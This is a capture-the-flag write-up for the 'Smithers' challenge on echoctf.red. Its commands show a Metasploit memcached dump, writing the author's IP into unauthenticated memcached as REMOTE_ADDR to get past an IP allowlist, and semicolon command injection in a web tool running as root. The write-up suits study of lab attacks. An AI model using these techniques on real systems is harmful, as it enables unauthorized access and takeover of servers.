## Introduction
This post details the process of solving the "Smithers" challenge on echoctf.red.

## Enumeration Phase

### Nmap Scan
I start the reconnaissance with nmap:

```
PORT      STATE SERVICE   VERSION
10888/tcp open  http      nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Network Tools
11211/tcp open  memcached Memcached 1.5.12 (uptime 224 seconds)
```

### Web Server on Port 10888
There is a web server running on port 10888:
![Webserver](/assets/webserver.png)

It mentions that these utilities are only available to authorized IP addresses.

### Extracting Information from Memcached with Metasploit
I use Metasploit to extract information from the memcached service:

```
msf6 > use auxiliary/gather/memcached_extractor

msf6 auxiliary(gather/memcached_extractor) > set rhosts 10.0.100.142 
rhosts => 10.0.100.142
msf6 auxiliary(gather/memcached_extractor) > exploit

[+] 10.0.100.142:11211    - Found 1 keys

Keys/Values Found for 10.0.100.142:11211
========================================

 Key     Value
 ---     -----
 ETSCTF  "VALUE ETSCTF 0 39\r\nETSCTF_<REDACTED>\r\nEND\r\n"

```

A flag is found in the memcached service.

## Exploitation Phase

### Using Telnet to Modify Memcached
The key is to store my IP address in the memcached service as `REMOTE_ADDR`. After some research, I use telnet to connect and store my IP address:

```
telnet 10.0.100.142 11211
Trying 10.0.100.142...
Connected to 10.0.100.142.
Escape character is '^]'.
add REMOTE_ADDR 0 0 10
<My IP>
STORED
```


### Accessing the Web Server
Once my address is stored, I can access the web server, which presents a command line interface:

Two flags are visible. Using a semicolon (`;`), I can run other commands and see that it runs as root. By executing:

```
grep -r 'ETSCTF' /
``` 

All flags are found.
